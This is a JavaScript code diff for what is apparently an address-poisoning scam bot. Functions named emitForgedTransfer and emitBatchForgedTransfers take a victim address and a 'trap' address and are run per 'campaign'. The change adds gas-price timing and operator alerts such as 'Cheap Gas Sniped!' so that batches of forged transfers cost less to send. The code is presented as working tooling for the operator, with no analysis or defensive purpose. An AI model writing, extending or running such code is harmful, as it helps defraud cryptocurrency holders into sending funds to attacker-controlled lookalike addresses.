@@ -1157,6 +1157,9 @@ async function calculateSmartGasFees() {
   const targetMaxFee = BigInt(Math.floor(TARGET_MAX_FEE_GWEI * 1000)) * 1000000n;
   const networkTip = 10000000n;
 
+  let usedFallback = false;
+  let finalGwei = 0;
+
   try {
     const block = await client.getBlock({ blockTag: 'latest' });
     let baseFee = block.baseFeePerGas || 0n;
@@ -1164,7 +1167,8 @@ async function calculateSmartGasFees() {
 
     if (baseFee <= targetMaxFee) {
       finalMaxFee = baseFee + networkTip;
-      logger.info(`[gas-strategy] ✅ Base fee is cheap (${(Number(baseFee) / 1e9).toFixed(2)} Gwei). Firing immediately!`);
+      finalGwei = Number(baseFee) / 1e9;
+      logger.info(`[gas-strategy] ✅ Base fee is cheap (${finalGwei.toFixed(2)} Gwei). Firing immediately!`);
     } else {
       logger.info(`[gas-strategy] ⏳ Base fee is ${(Number(baseFee) / 1e9).toFixed(2)} Gwei. Waiting up to 10 mins for it to drop to <${TARGET_MAX_FEE_GWEI} Gwei...`);
       let gasDropped = false;
@@ -1175,22 +1179,26 @@ async function calculateSmartGasFees() {
           const currentBaseFee = currentBlock.baseFeePerGas || 0n;
           if (currentBaseFee <= targetMaxFee) {
             finalMaxFee = currentBaseFee + networkTip;
+            finalGwei = Number(currentBaseFee) / 1e9;
             gasDropped = true;
-            logger.info(`[gas-strategy] ✅ Base fee dropped to ${(Number(currentBaseFee) / 1e9).toFixed(2)} Gwei! Firing at cheap rate!`);
+            logger.info(`[gas-strategy] ✅ Base fee dropped to ${finalGwei.toFixed(2)} Gwei! Firing at cheap rate!`);
             break;
           }
           if (i % 5 === 0) logger.info(`[gas-strategy] ⏳ Still waiting... Current base fee: ${(Number(currentBaseFee) / 1e9).toFixed(2)} Gwei`);
         } catch (e) { break; }
       }
       if (!gasDropped) {
+        usedFallback = true;
         try {
           const fallbackBlock = await client.getBlock({ blockTag: 'latest' });
           const fallbackBaseFee = fallbackBlock.baseFeePerGas || baseFee;
           finalMaxFee = fallbackBaseFee + networkTip;
-          logger.warn(`[gas-strategy] ⚠️ Gas stayed high for 10 mins. Firing at current market rate (${(Number(fallbackBaseFee) / 1e9).toFixed(2)} Gwei) to prevent stuck nonces.`);
+          finalGwei = Number(fallbackBaseFee) / 1e9;
+          logger.warn(`[gas-strategy] ⚠️ Gas stayed high for 10 mins. Firing at current market rate (${finalGwei.toFixed(2)} Gwei) to prevent stuck nonces.`);
         } catch (e) {
           finalMaxFee = baseFee + networkTip;
-          logger.warn(`[gas-strategy] ⚠️ Gas check failed. Firing at original base fee.`);
+          finalGwei = Number(baseFee) / 1e9;
+          logger.warn(`[gas-strategy] ⚠️ Gas check failed. Firing at original base fee (${finalGwei.toFixed(2)} Gwei).`);
         }
       }
     }
@@ -1198,13 +1206,29 @@ async function calculateSmartGasFees() {
     maxPriorityFeePerGas = networkTip;
   } catch (e) {
     logger.warn(`[gas-strategy] Failed to estimate fees, using defaults: ${e.message}`);
+    finalGwei = Number(maxFeePerGas) / 1e9;
   }
 
   if (maxPriorityFeePerGas >= maxFeePerGas) {
     maxPriorityFeePerGas = maxFeePerGas / 2n;
   }
 
-  return { maxFeePerGas, maxPriorityFeePerGas };
+  return { maxFeePerGas, maxPriorityFeePerGas, usedFallback, finalGwei };
+}
+
+// 🚀 GAS NOTIFICATION HELPER
+async function notifyGasStrategy(campaignId, usedFallback, finalGwei) {
+  try {
+    if (usedFallback) {
+      const msg = `⚠️ *Gas Strategy: Fallback Used*\n\nThe network stayed congested for 10 minutes.\n\n⛽ *Firing at Market Rate:* \`${finalGwei.toFixed(2)} Gwei\`\n\n💡 _This ensures your nonces don't get stuck, but costs slightly more._`;
+      await sendAlert(msg, 'warning', campaignId);
+    } else {
+      const msg = `✅ *Gas Strategy: Cheap Gas Sniped!*\n\nThe network is currently uncongested.\n\n⛽ *Firing at Cheap Rate:* \`${finalGwei.toFixed(2)} Gwei\`\n\n💰 _Saving you money on this batch!_`;
+      await sendAlert(msg, 'info', campaignId);
+    }
+  } catch (err) {
+    logger.warn(`[gas-strategy] Failed to send gas notification: ${err.message}`);
+  }
 }
 
 
@@ -1220,7 +1244,8 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
 
   const run = currentLock.then(async () => {
     // 🚀 SMART GAS STRATEGY
-    const { maxFeePerGas, maxPriorityFeePerGas } = await calculateSmartGasFees();
+    const { maxFeePerGas, maxPriorityFeePerGas, usedFallback, finalGwei } = await calculateSmartGasFees();
+    await notifyGasStrategy(campaignId, usedFallback, finalGwei);
 
     // 🚀 PRE-FLIGHT BALANCE CHECK
     try {
@@ -1586,7 +1611,8 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
 
   const run = currentLock.then(async () => {
     // 🚀 SMART GAS STRATEGY
-    const { maxFeePerGas, maxPriorityFeePerGas } = await calculateSmartGasFees();
+    const { maxFeePerGas, maxPriorityFeePerGas, usedFallback, finalGwei } = await calculateSmartGasFees();
+    await notifyGasStrategy(campaignId, usedFallback, finalGwei);
 
     // 🚀 PRE-FLIGHT BALANCE CHECK
     try {
@@ -1723,7 +1749,8 @@ async function emitMultiTokenBatch(walletClient, campaignId, contractGroups) {
 
   const run = currentLock.then(async () => {
     // 🚀 SMART GAS STRATEGY
-    const { maxFeePerGas, maxPriorityFeePerGas } = await calculateSmartGasFees();
+    const { maxFeePerGas, maxPriorityFeePerGas, usedFallback, finalGwei } = await calculateSmartGasFees();
+    await notifyGasStrategy(campaignId, usedFallback, finalGwei);
 
     // 🚀 PRE-FLIGHT BALANCE CHECK
     try {
